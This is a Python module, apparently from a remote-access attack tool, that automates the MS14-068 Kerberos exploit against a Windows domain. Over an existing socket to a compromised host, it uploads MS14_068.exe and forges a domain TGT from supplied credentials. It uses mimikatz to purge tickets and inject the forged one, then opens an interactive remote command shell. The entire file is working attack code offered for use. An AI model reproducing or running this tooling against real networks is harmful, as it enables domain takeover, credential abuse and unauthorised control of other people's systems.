import struct
from AuxiliaryFunctions import uploadCVE
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI


def MS14068(conn, choice):
    commands = ["exit", "upload MS14_068.exe", "exploit"]
    completer = WordCompleter(commands)
    formatted_text1 = ANSI('\033[1;1;1mMS14-068 > \033[0m')
    while True:
        try:
            command0 = prompt(formatted_text1, completer=completer)
            if command0 == "":
                continue
            elif command0.split()[0] == 'upload':
                uploadCVE.uploadCVE(conn, command0)
                continue
            elif command0 == 'exit':
                break
            elif command0 == 'exploit':
                print('\033[1;32;32m' + "[+] Generating TGT ticket......" + '\033[0m')
                command1 = "MS14_068.exe -u {}@{} -s {} -d {} -p {}".format(choice.split()[1], choice.split()[2], choice.split()[3], choice.split()[4], choice.split()[5])
                send_receive(conn, command1)
                print('\033[1;32;32m' + "[+] View tickets." + '\033[0m')
                command2 = "klist"
                send_receive(conn, command2)
                command3 = "mimikatz.exe \"privilege::debug\" \"kerberos::list\" exit"
                send_receive(conn, command3)
                print('\033[1;32;32m' + "[+] Delete tickets." + '\033[0m')
                command4 = "klist purge"
                command5 = "mimikatz.exe \"privilege::debug\" \"kerberos::purge\" exit"
                send_receive(conn, command4)
                send_receive(conn, command5)
                TGT = input('\033[1;1;1m' + "Input the TGT ticket's name > " + '\033[0m')
                print('\033[1;32;32m' + "[+] Importing the ticket......" + '\033[0m')
                command6 = "mimikatz.exe \"privilege::debug\" \"kerberos::ptc {}\" exit".format(TGT)
                send_receive(conn, command6)
                print('\033[1;32;32m' + "[+] The current ticket of the system:" + '\033[0m')
                command7 = "klist"
                send_receive(conn, command7)
                commands = ["exit"]
                completer = WordCompleter(commands)
                formatted_text1 = ANSI('\033[1;1;1m> \033[0m')
                while True:
                    exec = prompt(formatted_text1, completer=completer)
                    if exec == 'exit':
                        break
                    elif exec == "":
                        continue
                    else:
                        send_receive(conn, exec)
        except KeyboardInterrupt:
            print('\033[1;1;1m' + "[-] Exiting......" + '\033[0m')
            break
        except IndexError:
            print('\033[1;31;31m' + "[-] You need to offer other params." + '\033[0m')
            continue
        except:
            print('\033[1;31;31m' + "[-] Something error!" + '\033[0m')
            break


# 命令发送和响应接收函数
def send_receive(conn, command):
    conn.sendall(command.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break
